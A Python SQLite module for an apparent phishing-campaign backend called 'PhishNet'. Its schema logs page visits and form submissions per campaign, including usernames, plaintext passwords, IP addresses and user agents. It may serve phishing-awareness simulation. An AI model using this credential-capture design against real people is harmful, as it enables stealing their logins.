"""
Database initialization and management for PhishNet Backend
"""
import sqlite3
from datetime import datetime, timezone
from typing import Optional
from flask import g


class Database:
    """Simple database wrapper for SQLite operations"""
    
    def __init__(self, db_path: str):
        """
        Initialize database connection
        
        Args:
            db_path: Path to SQLite database file or ':memory:' for in-memory
        """
        self.db_path = db_path
        self._connection = None
    
    @property
    def connection(self):
        """Get or create database connection"""
        if self._connection is None:
            self._connection = sqlite3.connect(self.db_path, check_same_thread=False)
            self._connection.row_factory = sqlite3.Row
        return self._connection
    
    def connect(self):
        """Establish database connection"""
        return self.connection
    
    def close(self):
        """Close database connection"""
        if self._connection:
            self._connection.close()
            self._connection = None
    
    def execute(self, query: str, params: tuple = ()):
        """Execute a query and return cursor"""
        cursor = self.connection.cursor()
        cursor.execute(query, params)
        self.connection.commit()
        return cursor
    
    def fetchone(self, query: str, params: tuple = ()):
        """Execute query and fetch one result"""
        cursor = self.execute(query, params)
        return cursor.fetchone()
    
    def fetchall(self, query: str, params: tuple = ()):
        """Execute query and fetch all results"""
        cursor = self.execute(query, params)
        return cursor.fetchall()
    
    def init_schema(self):
        """Initialize database schema"""
        schema = """
        -- Page visits tracking
        CREATE TABLE IF NOT EXISTS page_visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id TEXT,
            user_identifier TEXT,
            ip_address TEXT,
            user_agent TEXT,
            visit_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            page_url TEXT NOT NULL
        );
        
        -- Form submissions tracking
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id TEXT,
            user_identifier TEXT,
            ip_address TEXT,
            user_agent TEXT,
            submission_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            username TEXT,
            password TEXT,
            additional_data TEXT,
            page_url TEXT NOT NULL
        );
        
        -- Create indexes for performance
        CREATE INDEX IF NOT EXISTS idx_visits_campaign 
            ON page_visits(campaign_id);
        
        CREATE INDEX IF NOT EXISTS idx_submissions_campaign 
            ON form_submissions(campaign_id);
        
        CREATE INDEX IF NOT EXISTS idx_visits_timestamp 
            ON page_visits(visit_timestamp);
        
        CREATE INDEX IF NOT EXISTS idx_submissions_timestamp 
            ON form_submissions(submission_timestamp);
        """
        
        self.connection.executescript(schema)
        self.connection.commit()


# Global database instance cache
_db_instances = {}


def get_db(db_path: str) -> Database:
    """Get or create database instance (singleton per path)"""
    if db_path not in _db_instances:
        db = Database(db_path)
        db.init_schema()
        _db_instances[db_path] = db
    return _db_instances[db_path]
